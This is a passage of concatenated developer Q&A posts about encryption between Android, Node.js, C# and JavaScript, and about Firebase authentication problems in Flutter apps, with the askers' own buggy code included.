// encode key to Base 64
const base64Key = Buffer.from(GenKey).toString('base64');

const OBJ = {
username: &quot;xxx&quot;,
password: &quot;xasadsd&quot;,
encryptKey: base64Key,
refreshToken: &quot;false&quot;
}

let jsonOBJ = JSON.stringify(OBJ);

function encryptString (plaintext, publicKeyFile) {
const publicKey = fs.readFileSync(publicKeyFile, &quot;utf8&quot;);

    // publicEncrypt() method with its parameters 
    const encrypted = crypto.publicEncrypt( 
             publicKey, Buffer.from(plaintext)); 
    return encrypted; 

}

const encrypted = encryptString(jsonOBJ, CRTpath);

const baseEncrypted = Buffer.from(encrypted, 'utf8').toString(&quot;base64&quot;);
</code></pre>
<p>EDIT 1: I need to send a paylod as follows:</p>
<pre><code>{
  requestID: &quot;string&quot;, // this part is OK
  payload: &quot;&quot; // value of encrypted above
}
</code></pre>
<p>EDIT 2(specifications):</p>
<p>5.1.10. Steps to produce Authentication JSON in format requested
Steps</p>
<ol>
<li>Generate a key (encryptKey) using AES 256(AES/ECB/PKCS5Padding) algorithm and encode key to Base 64 String</li>
<li>Generate JSON corresponding to the “payload” attribute (username, password, encryptKey, refreshToken)</li>
<li>Encrypt JSON string from step 2 using MAURA Public Key and encode to Base 64 String. The public key encryption uses the standard RSA algorithm.</li>
</ol>
<p>So far this is not working and returns a 404.</p>
<p>a) I am trying to use Nodejs Crypto module to generate a random key using AES 256(AES/ECB/PKCS5Padding) algorithm.</p>
<p>b) I have to encrypt the key using a public key (.crt) files // This part i can deal with</p>
<p>c) Then send it as payload... // this part i can deal with</p>
<p>But however after numerous tries and reading docs, i could not wrap my head around the point a)...
I believe that i have wrongly done the ecryption before encoding to base64</p>
<p>Any help or leads will be most welcomed... many thanks</p>
"
"<p>I tried to copy the code from this video:
<a href=""https://www.youtube.com/watch?v=HmkwOygpaqg&amp;t=588s"" rel=""nofollow noreferrer"">https://www.youtube.com/watch?v=HmkwOygpaqg&amp;t=588s</a></p>
<p>I stopped at 18:15 and tried to debug the code.
But after the loading I got a whitescreen and the code stopped in the main-method every time at <code>await</code>.</p>
<pre><code>Future&lt;void&gt; main() async {
  WidgetsFlutterBinding.ensureInitialized();
await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  runApp(const MyApp());
}
</code></pre>
<p>I tried to run <code>flutter channel stable</code> and <code>flutter upgrade</code>. But it does not help me in this case.
It seems like I took a breaking point or the code is waiting for something.</p>
<p>Did I forget something in my settings or what could it be?</p>
"
"<p>What exactly does <code>Firebase.auth.currentUser</code> do, especially: are there cases where this makes any network requests, e.g. to check if a token is still valid? Or is this always just a simple property that can be checked &quot;instantly&quot; without any waiting time?</p>
"
"<p>I have been working about a week on this whole thing and I have hit the same walls with AI, google, crypto documentation and Android Developer Documentation. So I wanted to atleast make some headway here.</p>
<p>I am trying to encrypt data and decrypt it on my server and I am getting the error:
Error during decryption: Unsupported state or unable to authenticate data
Stack Trace: Error: Unsupported state or unable to authenticate data
at Decipheriv.final (node:internal/crypto/cipher:193:29)</p>
<p>Node.js v20.11.1</p>
<p>My use case: Establish a secure communication channel between Android and NodeJS Server to protect sensitive data.</p>
<p>I don't know what I am doing wrong and I started learning Cryptography 2 weeks ago. Any help in solving this and I would be extremely grateful. Bonus if you also solve Encryption and Decryption on the Android</p>
<p>Process Overview:
Step 1: Generate public/private secp256r1 EC KeyPair on AndroidKeyStore and send the public Key to NodeJS.
1A generate the keys</p>
<pre><code>fun generateECDHKeyPair() {
            val keyStore = KeyStore.getInstance(KEYSTORE_TYPE).apply { load(null) }
            if (!keyStore.containsAlias(keyAlias)) {
                val keyPairGenerator = KeyPairGenerator.getInstance(
                    KeyProperties.KEY_ALGORITHM_EC, KEYSTORE_TYPE)

                val ecSpec = ECGenParameterSpec(&quot;secp256r1&quot;)

                val keyGenParameterSpec = KeyGenParameterSpec.Builder(
                    keyAlias,
                    KeyProperties.PURPOSE_SIGN or KeyProperties.PURPOSE_VERIFY or KeyProperties.PURPOSE_AGREE_KEY) // Adjusted for ECDH not supported below android 31
                    .setAlgorithmParameterSpec(ecSpec)
                    .build()

                keyPairGenerator.initialize(keyGenParameterSpec)
                keyPairGenerator.generateKeyPair()
                Log.i(&quot;Key Generate&quot;, &quot;Generated new Key for keyAlias: $keyAlias&quot;)

            }
        }
</code></pre>
<p>Step 2 Return the public</p>
<pre><code>fun getPublicKey(): String {
            generateKeyPairIfNeeded()
            val keyStore = KeyStore.getInstance(KEYSTORE_TYPE).apply { load(null) }
            Log.i(&quot;Get Public Key&quot;, &quot;Key Alias used is: $keyAlias&quot;)

            val certificate = keyStore.getCertificate(keyAlias)
            // Get the public key from the certificate
            val publicKey = certificate.publicKey

            // The public key is already part of the certificate which is in X.509 format
            val x509EncodedPublicKey = publicKey.encoded
            return Base64.getEncoder().encodeToString(x509EncodedPublicKey);
        }

</code></pre>
<p>Step 3 Send to the Server - I am using an InstrumentTest at the moment and okHTTP.</p>
<p>Step 4 Receive the public Key on NodeJS, generate a shared secret</p>
<pre><code>// Define the EC public key schema
const ECPublicKey = asn1.define(&quot;ECPublicKey&quot;, function () {
  this.seq().obj(
    this.key(&quot;algorithm&quot;)
      .seq()
      .obj(this.key(&quot;id&quot;).objid(), this.key(&quot;curve&quot;).objid()),
    this.key(&quot;pub&quot;).bitstr()
  );
});

const keyPair = crypto.createECDH(&quot;prime256v1&quot;);
        keyPair.generateKeys();
        const publicKeyBase64 = data.publicKey;
        console.log(`Received publicKey: ${publicKeyBase64}`);

        const publicKeyDer = Buffer.from(publicKeyBase64, &quot;base64&quot;);
        const publicKeyParsed = ECPublicKey.decode(publicKeyDer, &quot;der&quot;);
        const publicKeyBuffer = Buffer.from(publicKeyParsed.pub.data, &quot;base64&quot;);
        const sharedSecret = keyPair.computeSecret(publicKeyBuffer);
</code></pre>
<p>Step 5 Derive an AES GCM key for future Encryption and Decryption operations.</p>
<pre><code>
function getAESKey(sharedSecret) {
  // Assuming 'sharedSecret' is a Buffer
  const salt = crypto.randomBytes(16); // A random salt enhances security
  const info = 'AES-256-GCM key derivation'; // Context and application-specific information
  const keyLength = 32; // 32 bytes for AES-256

  const hkdfKey = crypto.hkdfSync('sha512', sharedSecret, salt, info, keyLength);
  return hkdfKey;
}

const aesKey = getAESKey(sharedSecret);

</code></pre>
<p>Step 6 (This part took a while to find on stack overflow) Return the x509 formatted public key to the Android</p>
<pre><code>// get public key in uncompressed format
        var publicKeyServer = keyPair.getPublicKey();

        // export as hex encoded uncompressed key (0x04 + &lt;x&gt; + &lt;y&gt;)
        console.log(publicKeyServer.toString(&quot;hex&quot;));

        // export as PEM encoded key in X.509/SPKI format: -----BEGIN PUBLIC KEY-----...
        var x509Pem = ecKeyUtils.generatePem({
          curveName: &quot;prime256v1&quot;,
          publicKey: publicKeyServer,
        }).publicKey; // PEM encoded
        console.log(&quot;X509PEM: &quot; + x509Pem);

        // export as Base64 encoded DER encoded key in X.509/SPKI format (X509EncodedKeySpec() requires the DER encoded key in X.509/SPKI format)
        var x509Der = crypto
          .createPublicKey(x509Pem)
          .export({ type: &quot;spki&quot;, format: &quot;der&quot; }); // DER encoded
        var x509DerB64 = x509Der.toString(&quot;base64&quot;); // Base64 encoded DER encoded
        console.log(&quot;x509DerB64 being returned: &quot; + x509DerB64);
        successJsonMessageResponse(res, 200, {
          message: &quot;Public key received and processed.&quot;,
          publicKeyServer: x509DerB64,
        });
</code></pre>
<p>Step 7 Receive the servers public key</p>
<pre><code>fun receivePublicKey(x509DerB64 : String){
                val decKey = Base64.getDecoder().decode(x509DerB64)
                val keyFactory = KeyFactory.getInstance(&quot;EC&quot;)
                val genPublicKey = keyFactory.generatePublic(X509EncodedKeySpec(decKey))
                // To print the public key in Base64 string format
                val publicKeyB64 = Base64.getEncoder().encodeToString(genPublicKey.encoded)
                println(&quot;Public Key in Base64: $publicKeyB64&quot;)
</code></pre>
<p>Step 8 and 9 generate a Shared Secret and store the AES key</p>
<pre><code>
fun generateSharedSecret(publicKey: PublicKey): ByteArray? {
            try {
                val keyAgreement = getKeyAgreement()
                keyAgreement?.doPhase(publicKey, true)
                val sharedSecret = keyAgreement?.generateSecret()
                if (sharedSecret == null) {
                    Log.e(&quot;generateSharedSecret&quot;, &quot;Failed to generate shared secret.&quot;)
                } else {
                    Log.i(&quot;generateSharedSecret&quot;, &quot;Shared secret generated successfully.&quot;)
                }
                return sharedSecret
            } catch (e: Exception) {
                Log.e(&quot;generateSharedSecret&quot;, &quot;Exception in generating shared secret: ${e.message}&quot;)
                return null
            }
        }

val sharedSecret = generateSharedSecret(genPublicKey)
                if (sharedSecret != null) {
                    storeDerivedAESKey(sharedSecret)
                    // Proceed to store the AES key in the KeyStore
                } else {
                // Log the error with a specific message
                Log.e(&quot;SharedSecretError&quot;, &quot;Failed to generate the shared secret. This might be due to incompatible keys or a failure in the cryptographic operation.&quot;)

            }
        }

fun storeDerivedAESKey(sharedSecret: ByteArray) {
            try {
                // Assuming salt and info are predefined or generated as needed
                val salt = ByteArray(16) // Should be randomly generated ideally
                val info = &quot;AES-256-GCM key derivation&quot;.toByteArray() // Context-specific info
                val derivedKeyLength = 32 // Length for AES-256 key

                // Derive the AES key using HKDF
                val aesKeyBytes = hkdf(sharedSecret, salt, info, derivedKeyLength)
                if (aesKeyBytes == null) {
                    Log.e(&quot;storeDerivedAESKey&quot;, &quot;Failed to derive AES key using HKDF.&quot;)
                    return
                }
                val aesKey = SecretKeySpec(aesKeyBytes, &quot;AES&quot;)

                // Proceed with storing the AES key in the KeyStore as before
                val keyStore = KeyStore.getInstance(&quot;AndroidKeyStore&quot;).apply { load(null) }
                val keyProtection = KeyProtection.Builder(KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT)
                    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
                    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
                    .build()
                keyStore.setEntry(keyAlias, KeyStore.SecretKeyEntry(aesKey), keyProtection)

                Log.i(&quot;storeDerivedAESKey&quot;, &quot;AES key derived using HKDF and stored successfully.&quot;)
            } catch (e: Exception) {
                Log.e(&quot;storeDerivedAESKey&quot;, &quot;Exception in storing derived AES key: ${e.message}&quot;)
            }
        }

fun hkdf(ikm: ByteArray?, salt: ByteArray?, info: ByteArray?, length: Int): ByteArray? {
            // Extract
            val mac = Mac.getInstance(&quot;HmacSHA256&quot;)
            mac.init(SecretKeySpec(salt, &quot;HmacSHA256&quot;))
            val prk = mac.doFinal(ikm)

            // Expand
            val okm = ByteArray(length)
            var previousBlock = ByteArray(0)
            var bytesGenerated = 0
            mac.init(SecretKeySpec(prk, &quot;HmacSHA256&quot;))
            var i = 1
            while (bytesGenerated &lt; length) {
                mac.update(previousBlock)
                mac.update(info)
                mac.update(i.toByte())
                previousBlock = mac.doFinal()
                System.arraycopy(
                    previousBlock,
                    0,
                    okm,
                    bytesGenerated,
                    Math.min(previousBlock.size, length - bytesGenerated)
                )
                bytesGenerated += previousBlock.size
                i++
            }
            return okm
        }
</code></pre>
<p>All these steps are successful</p>
<p>Now I am trying to encrypt data and decrypt it on my server and I am getting the error:
Error during decryption: Unsupported state or unable to authenticate data
Stack Trace: Error: Unsupported state or unable to authenticate data
at Decipheriv.final (node:internal/crypto/cipher:193:29)</p>
<p>The steps I am taking to encrypt data and send to nodeJS to decrypt are</p>
<p>Step 1 (Logging is for debug purposes and will be removed)</p>
<pre><code>
fun retrieveAESKey(alias: String): SecretKey? {
            try {
                val keyStore = KeyStore.getInstance(KEYSTORE_TYPE).apply { load(null) }
                // Retrieve the key entry from the KeyStore
                val secretKeyEntry = keyStore.getEntry(alias, null) as? KeyStore.SecretKeyEntry
                return secretKeyEntry?.secretKey
            } catch (e: Exception) {
                Log.e(&quot;Retrieve AES Key&quot;, &quot;Error retrieving AES Key: ${e.message}&quot;)
                return null
            }
        }

        fun initializeAesGcmCipherForEncryption(TRANSFORMATION: String, secretKey: SecretKey): Cipher {
            Log.v(&quot;Encryption&quot;, &quot;Getting cipher with ${TRANSFORMATION}&quot;)
            val cipher = Cipher.getInstance(TRANSFORMATION)
            Log.v(&quot;Encryption&quot;, &quot;Initializing cipher with secret Key&quot;)
//                cipher.init(Cipher.ENCRYPT_MODE, secretKey) // Let Cipher generate an IV automatically
            cipher.init(Cipher.ENCRYPT_MODE, secretKey) // 12 bytes IV, randomly generated
//            cipher.updateAAD(&quot;aad&quot;.getBytes());
            return cipher
        }

fun encryptDataStatic(plaintext: String): String? {
//            listSecurityProviders();
            // Assuming secretKey is of type SecretKey
            Log.d(&quot;Encryption&quot;, &quot;plaintext to Encrypt: ${plaintext}&quot;) // Logs the format of the key (e.g., &quot;RAW&quot;)

            try {
                Log.v(&quot;Encryption&quot;, &quot;Starting encryption process&quot;)

                // Retrieve the secret key from the KeyStore
                Log.v(&quot;Encryption&quot;, &quot;Retrieving secret key from KeyStore&quot;)
                val secretKey = retrieveAESKey(keyAlias) ?: throw Exception(&quot;Secret Key not found&quot;)
                Log.v(&quot;Encryption&quot;, &quot;Secret key retrieved successfully&quot;)
                // Assuming secretKey is of type SecretKey
                Log.d(&quot;Encryption&quot;, &quot;Secret Key Format: ${secretKey.format}&quot;) // Logs the format of the key (e.g., &quot;RAW&quot;)
                Log.d(&quot;Encryption&quot;, &quot;Secret Key Algorithm: ${secretKey.algorithm}&quot;) // Logs the algorithm of the key
                val encodedKey = secretKey.encoded // This might be null if the key does not support encoding
                if (encodedKey != null) {
                    Log.d(&quot;Encryption&quot;, &quot;Secret Key Length (bytes): ${encodedKey.size}&quot;)
                    Log.d(&quot;Encryption&quot;, &quot;Secret Key Length (bits): ${encodedKey.size * 8}&quot;)
                } else {
                    Log.d(&quot;Encryption&quot;, &quot;Unable to retrieve encoded key for length due to security restrictions.&quot;)
                }
                // Initialize the cipher
                // Assuming secretKey already contains the encoded form suitable for AES/GCM/NoPadding
                val ivBytes = ByteArray(12) // Ensure this is securely generated
                SecureRandom().nextBytes(ivBytes) // Securely generate the IV
                // Initialize the cipher using the helper function
                val TRANSFORMATION = &quot;AES/GCM/NoPadding&quot;;

                val cipher = initializeAesGcmCipherForEncryption(TRANSFORMATION, secretKey)
//                val cipher = initializeAesGcmCipherForEncryption(secretKey.encoded, ivBytes)
                Log.v(&quot;Encryption&quot;, &quot;Cipher initialized successfully&quot;)

                // Encrypt the data
                Log.v(&quot;Encryption&quot;, &quot;Encrypting data&quot;)
                val encryptedData = cipher.doFinal(plaintext.toByteArray(Charsets.UTF_8))

                // Retrieve the automatically generated IV
//                val ivBytes = cipher.iv // Retrieve the automatically generated IV
//                val authTag = //Get Message Authentication Code
                Log.v(&quot;Encryption&quot;, &quot;Data encrypted successfully: ${encryptedData.toHex()}&quot;)
                Log.v(&quot;Encryption&quot;, &quot;IV retrieved successfully: ${cipher.iv.toHex()}&quot;)

                // Combine IV and encrypted data
                val combinedData = cipher.iv + encryptedData
                Log.v(&quot;Encryption&quot;, &quot;IV and encrypted data combined successfully: ${combinedData.toHex()}&quot;)

                Log.v(&quot;Encryption&quot;, &quot;Encryption process completed successfully&quot;)
                return Base64.getEncoder().encodeToString(combinedData);
            } catch (e: Exception) {
                Log.e(&quot;Encryption&quot;, &quot;Error during encryption: ${e.message}&quot;)
                return null
            }
        }

</code></pre>
<p>Android while performing doFinal will automatically encode the last 16 bytes as the MAC/Auth tag per the documentation <a href=""https://developer.android.com/reference/javax/crypto/Cipher#doFinal(byte%5B%5D)"" rel=""nofollow noreferrer"">https://developer.android.com/reference/javax/crypto/Cipher#doFinal(byte[])</a></p>
<p>I send it to my server to decrypt following the process:</p>
<pre><code>
function decryptData(combinedData, aesKey) {
  // First, convert the base64 encoded data back to a Buffer
  const combinedBuffer = Buffer.from(combinedData, &quot;base64&quot;);
  console.log(`combinedBuffer: ${combinedBuffer.toString(&quot;hex&quot;)}`)
  // Extract the IV (typically 12 bytes for AES/GCM)
  const iv = combinedBuffer.slice(0, 12);

  // If you know the authTag is at the end and is 16 bytes long, extract it
  const authTag = combinedBuffer.slice(combinedBuffer.length - 16);

  // The encrypted data is what's left after removing the IV and authTag
  const encryptedData = combinedBuffer.slice(12, combinedBuffer.length - 16);
  console.log(
    `IV: ${iv.toString(&quot;hex&quot;)}, Encrypted Data: ${encryptedData.toString(
      &quot;hex&quot;
    )}, Auth Tag: ${authTag.toString(&quot;hex&quot;)}`
  );
  try {
    // Key bytes length depends on algorithm being used:
    // 'aes-128-gcm' = 16 bytes
    // 'aes-192-gcm' = 24 bytes
    // 'aes-256-gcm' = 32 bytes
    const decipher = crypto.createDecipheriv(&quot;aes-256-gcm&quot;, aesKey, iv);
    decipher.setAuthTag(authTag);
    let decrypted = decipher.update(encryptedData, null, &quot;utf8&quot;);
    decrypted += decipher.final(&quot;utf8&quot;);
    return decrypted;
  } catch (error) {
    console.error(`Error during decryption: ${error.message}`);
    console.error(`Stack Trace: ${error.stack}`); // Log the stack trace
    throw error; // Rethrowing the error or handle as appropriate
  }
}
aesKeysByClientId = {} //Previously Set with public key exchange

const aesKey = aesKeysByClientId[data.clientId];
        if (!aesKey) {
          console.log(`AES key not found for clientId: ${data.clientId}`);
          return errorMessageResponse(
            res,
            404,
            &quot;Client ID not found or AES key missing&quot;
          );
        } else {
          console.log(
            `AES key found for clientId: ${data.clientId}, proceeding to decrypt`
          );
        }

        // Attempting to decode and decrypt the message
        try {
          // Assuming 'data.message' is your Base64-encoded combined IV + encrypted data
          const base64DecodedMessage = Buffer.from(data.message, &quot;base64&quot;);
          console.log(
            `Base64 decoded message: ${base64DecodedMessage.toString(&quot;hex&quot;)}`
          );

          const decryptedMessage = decryptData(base64DecodedMessage, aesKey);
          console.log(&quot;Decrypted message:&quot;, decryptedMessage);

</code></pre>
<p>here let decrypted = decipher.update(encryptedData, null, &quot;utf8&quot;);
decrypted += decipher.final(&quot;utf8&quot;);</p>
<p>is what throws the error :(</p>
"
"<p>I am new to Firebase Auth and some questions came up to me:</p>
<ol>
<li>When I sign in (and stay logged in), where is that stored on my android device?</li>
<li>I assume Firebase uses tokens? How long are they valid and are they only refreshed while my app is running or is there some kind of service involved that refreshes tokens no matter if my app is opened by the user or not?</li>
</ol>
"
"<p><strong>I am building an app where security is really important.</strong>
For the user authentication, I currently use the basic email/password auth with Firebase.
Firebase is as well used as my database.</p>
<p><strong>I would like to enhance the security of my authentication flow, adding a deviceID factor in addition to the email/password factors.</strong></p>
<p>Here is the flow idea:</p>
<ul>
<li>I generate a deviceID (store in secure storage) when a user create an account for its current device.</li>
<li>When the user will login later, it will check if its current deviceID (if existing in secure storage) is saved as a trusted device in the database</li>
<li>If not trusted, an OTP challenge will be triggered. If succeed, the current device will be added to the list of trusted devices</li>
</ul>
<p>Some people does that locally, but it is not secure (Firebase auth API is still available with only email/password in bypassing the app UI).</p>
<p>**I am looking for a solution to integrate the deviceID factor to an authentication flow.
**</p>
<p>Research I have done:</p>
<ul>
<li>Firebase blocking functions: unfortunately we cannot pass custom parameter, and the native values of the event parameters (IP address, userAgent...) are not enough robust/secure</li>
<li>Firebase cloud functions: not directly correlated to the authentication flow, so the Firebase auth API will remain available with only email/password in bypassing the app UI)</li>
<li>Supabase: does not propose custom authentication, and the serverless function got the same issue as the Firebase cloud functions</li>
<li>Local custom actions: same issue as cloud functions</li>
</ul>
<p><strong>Promising trails:</strong></p>
<p>The Firebase custom Token allow to connect a user and use the Firebase services, which is great given the Firebase integration is nice on Flutter.</p>
<p>It involves either:</p>
<ul>
<li>to create my own auth backend, which could cause security flaws (given I am not an expert) and as well adding more code to manage</li>
<li>or to use an external auth provider (Clerk, Auth0, Amazon Cognito...)</li>
</ul>
<p><strong>Has someone already solve this can of issue for its app ?
Has some already integrated Clerk, Auth0 or Cognito as custom authentication provider in its FlutterFlow app?</strong></p>
<p>Thanks in advance for replies</p>
"
"<p>I am using Firebase Phone Authentication in an app I've created but suddenly its stopped working from today and I'm using App Check as well, any one know the solution ?</p>
<p><strong>Console Log :</strong></p>
<blockquote>
<p>W/LocalRequestInterceptor( 6077): Error getting App Check token; using placeholder token instead. Error: com.google.firebase.FirebaseException: -9: Integrity API error (-9): Binding to the service in the Play Store has failed. This can be due to having an old Play Store version installed on the device.<br><br>
D/FirebaseAuth( 6077): Invoking original failure callbacks after phone verification failure for +97471******, error - This request is missing a valid app identifier, meaning that Play Integrity checks, and reCAPTCHA checks were unsuccessful. Please try again, or check the logcat for more details.</p>
</blockquote>
<p>I have tried multiple solutions</p>
"
"<p>I have an application that I'm developing that needs to be able to encrypt a string solely on the front end with a key. I can get the encryption and decryption working in the front end completely fine using CryptoJS. I've used this Gist as an example. <a href=""https://gist.github.com/dudepare/99f4d682c3db90ea86a4331e32f0006a"" rel=""nofollow noreferrer"">https://gist.github.com/dudepare/99f4d682c3db90ea86a4331e32f0006a</a></p>
<p>The complication is that I need to be able to decrypt it on a server running C#. I am currently trying with the following code:</p>
<pre><code>using System.Text;

namespace anApplication
{
    public class DecryptionService : IDecryptionService
    {
        public string DecryptString(string encryptedMessage, string key)
        {
            // Convert the key to bytes
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);

            // Get the IV (first 16 bytes of the encrypted message)
            byte[] iv = Convert.FromBase64String(encryptedMessage).Take(16).ToArray();

            // Get the ciphertext (the rest of the encrypted message)
            byte[] ciphertext = Convert.FromBase64String(encryptedMessage).Skip(16).ToArray();

            // Create an AES decryptor
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = keyBytes;
                aesAlg.IV = iv;

                // Create a decryptor to perform the stream transform
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for decryption
                using (MemoryStream msDecrypt = new MemoryStream(ciphertext))
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                {
                    // Read the decrypted bytes from the decrypting stream
                    return srDecrypt.ReadToEnd();
                }
            }
        }
    }
}
</code></pre>
<p>I have tried matching up all of the specific values for the IV, padding etc (including specifying the defaults to ensure they are all set correctly) but still cannot come back with the same value from both the front end encryption -&gt; front end decryption and front end encryption -&gt; back end decryption.</p>
<p>My question is not so much how to do it (although if someone has this working and can share that code then I'd happily receive that example and worship that individual as a deity) but more whether it is correct that multiple implementations of the same cryptographic algorithm should produce the same output values and be interchangeable for decryption (given that all of the variables are set the same obviously)?</p>
<p>Bonus points for suggestions on implementations that are compatible in C# and JS if the above answer is that they should be interchangeable and megapoints giveaway for someone who can share a working example of the three methods (JSEncryption, JSDecryption, C#Decryption)</p>
<p>Thanks in advance for any information.</p>
"
"<p>I have a question about Firestore in Flutter because I have an impasse in my app because I have a login page where there are the fields Country, email and password for login and I would like to be able to authenticate the user using these 3 fields but when I need to use the country via Firestore I cannot retrieve it and this field is used in validation, it seems to me that for you to retrieve a field from Firestore you cannot exit via Firebase Auth as you need currentUser to access the field, I found This is strange and I'm not able to do this logic where it first checks if the user is authenticated and then accesses the country field in Firebase and validates the login. Has anyone ever done something similar?</p>
<p>this my loginPage</p>
<pre><code>import 'package:flutter/gestures.dart';
import 'package:flutter/material.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:whatsapp/Pages/reset_page.dart';
import 'package:whatsapp/Pages/sign_up.dart';
import 'package:whatsapp/auth/auth_page.dart';
import 'package:whatsapp/components/dropdown_button.dart';
import 'package:whatsapp/components/text_field.dart';

class LoginPage extends StatefulWidget {
  const LoginPage({super.key});

  @override
  State&lt;LoginPage&gt; createState() =&gt; _LoginPageState();
}

class _LoginPageState extends State&lt;LoginPage&gt; {
  final formKey = GlobalKey&lt;FormState&gt;();
  String? name;
  final TextEditingController _emailController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();
  bool obscureText = true;
  String? _selectedCountry;  
  String? countryValue;
  String? errorMessage;
  String? errorMessageEmail;
  String? errorMessagePassword;
  String? errorMessageCountry;
  final AuthPage _authPage = AuthPage();  
  

  _validateFields() async {
    String email = _emailController.text;
    String password = _passwordController.text;     

    if (_selectedCountry == 'United Kingdom') {
      if (email.isNotEmpty &amp;&amp; email.contains(&quot;@&quot;)) {
        if (password.isNotEmpty) {
          errorMessage = null;
          errorMessageEmail = null;
          errorMessagePassword = null;
          signUserIn();
        } else {
          setState(() {
            errorMessagePassword = 'Please enter your password';
          });
        }
      } else {
        setState(() {
          errorMessageEmail = 'Please enter your E-mail ';
        });
      }
    } else {
      setState(() {
        errorMessage = 'Please enter your country';
      });
    }
  }

  signUserIn() async {
    String email = _emailController.text;
    String password = _passwordController.text;         
   
    String? authResult = await _authPage.loginUser(
        context, mounted, email, password);   
            
    setState(() {
      errorMessage = authResult;
    });
  }

  @override
  Widget build(BuildContext context) {
    final deviceWidth = MediaQuery.of(context).size.width;
    final deviceHeight = MediaQuery.of(context).size.height;

    return PopScope(
      canPop: false,
      child: SafeArea(
        child: Scaffold(
            backgroundColor: const Color(0xFF101d25),
            appBar: AppBar(
                automaticallyImplyLeading: false,
                toolbarHeight: deviceHeight &lt; 500
                    ? deviceHeight * 0.15
                    : deviceHeight * 0.09,
                centerTitle: true,
                backgroundColor: const Color(0xFF101d25),
                title: const Padding(
                  padding: EdgeInsets.only(top: 10),
                  child: Text('Verify your E-mail',
                      style: TextStyle(
                          color: Color(0xFF0ca886),
                          fontWeight: FontWeight.bold)),
                ),
                actions: [
                  IconButton(
                    icon: const Icon(Icons.more_vert, color: Color(0xFF0ca886)),
                    onPressed: () {},
                  ),
                ]),
            body: SingleChildScrollView(
              child: Center(
                child: SizedBox(
                  height: deviceHeight &lt; 500
                      ? deviceHeight * 1.30
                      : deviceHeight * 0.80,
                  width: deviceWidth &lt; 500
                      ? deviceWidth * 0.80
                      : deviceWidth * 0.60,
                  child: Column(
                    //mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      const Padding(
                        padding: EdgeInsets.only(top: 10),
                        child: Text(
                          'WhatsApp will verify your registred\n e-mail. Enter your country, e-mail and password:',
                          textAlign: TextAlign.center,
                          style: TextStyle(fontSize: 18, color: Colors.white),
                        ),
                      ),
                      SizedBox(height: deviceHeight * 0.05),
                      Form(
                        key: formKey,
                        child: Column(
                          children: [
                            CustomDropDownButton(
                              value: _selectedCountry,
                              onChanged: (newValue) {
                                _selectedCountry = newValue;
                              },
                            ),
                            SizedBox(height: deviceHeight * 0.03),
                            CustomTextField(
                              labelText: 'E-mail',
                              keyboardType: TextInputType.emailAddress,
                              controller: _emailController,
                              onChanged: (value) {
                                if (value.isNotEmpty &amp;&amp; value.contains(&quot;@&quot;)) {
                                  errorMessageEmail = null;
                                }
                              },
                              errorText: errorMessageEmail,
                            ),
                            SizedBox(height: deviceHeight * 0.02),
                            CustomTextField(
                              labelText: 'Password',
                              suffixIcon: GestureDetector(
                                onTap: () {
                                  setState(() {
                                    obscureText = !obscureText;
                                  });
                                },
                                child: Padding(
                                  padding: EdgeInsets.only(
                                      top: deviceHeight &lt; 500
                                          ? deviceHeight * 0.055
                                          : deviceHeight * 0.025),
                                  child: FaIcon(
                                      obscureText
                                          ? FontAwesomeIcons.solidEye
                                          : FontAwesomeIcons.solidEyeSlash,
                                      color: const Color(0xFF0ca886),
                                      size: 22),
                                ),
                              ),
                              keyboardType: TextInputType.visiblePassword,
                              obscureText: obscureText,
                              onChanged: (value) {
                                if (value.isNotEmpty) {
                                  errorMessagePassword = null;
                                }
                              },
                              controller: _passwordController,
                              errorText: errorMessagePassword,
                            ),
                          ],
                        ),
                      ),
                      SizedBox(height: deviceHeight * 0.02),
                      RichText(
                        text: TextSpan(children: [
                          TextSpan(
                              text: 'Forgot your password?',
                              style: const TextStyle(
                                  color: Colors.blue, fontSize: 15),
                              recognizer: TapGestureRecognizer()
                                ..onTap = () {
                                  //print('reset password');
                                  Navigator.push(
                                      context,
                                      MaterialPageRoute(
                                          builder: (context) =&gt;
                                              const ResetPasswordPage()));
                                }),
                        ]),
                      ),
                      SizedBox(height: deviceHeight * 0.01),
                      Text(
                        errorMessage ??
                            '', // Exibe a mensagem de erro ou uma string vazia
                        style: const TextStyle(
                          color:
                              Colors.red, // Cor vermelha para indicar um erro
                          fontSize: 16,
                        ),
                      ),
                      SizedBox(height: deviceHeight * 0.01),
                      SizedBox(
                        height: deviceHeight &lt; 500
                            ? deviceHeight * 0.15
                            : deviceHeight * 0.06,
                        width: deviceWidth &lt; 500
                            ? deviceWidth * 0.68
                            : deviceWidth * 0.38,
                        child: ElevatedButton(
                          style: ElevatedButton.styleFrom(
                              shape: BeveledRectangleBorder(
                                borderRadius: BorderRadius.circular(2),
                              ),
                              backgroundColor: const Color(0xFF0ca886)),
                          onPressed: () {
                            _validateFields();
                          },
                          child: Padding(
                            padding: EdgeInsets.symmetric(
                                vertical: deviceWidth * 0.012),
                            child: const Text(
                              'Enter',
                              style: TextStyle(
                                  color: Color(0xFF121a21), fontSize: 18),
                            ),
                          ),
                        ),
                      ),
                      Padding(
                        padding: EdgeInsets.only(top: deviceHeight * 0.02),
                        child: RichText(
                            text: TextSpan(children: [
                          const TextSpan(
                              text: &quot;Don't have a account yet?  &quot;,
                              style:
                                  TextStyle(color: Colors.white, fontSize: 14)),
                          TextSpan(
                              text: 'SignUp.',
                              style: const TextStyle(
                                  color: Colors.blue,
                                  fontSize: 14,
                                  fontWeight: FontWeight.bold),
                              recognizer: TapGestureRecognizer()
                                ..onTap = () {
                                  Navigator.push(
                                      context,
                                      MaterialPageRoute(
                                          builder: (context) =&gt;
                                              const SignupPage()));
                                }),
                        ])),
                      )
                    ],
                  ),
                ),
              ),
            )),
      ),
    );
  }
}
</code></pre>
<p>and here my AuthPage</p>
<pre><code>import 'package:cloud_firestore/cloud_firestore.dart';
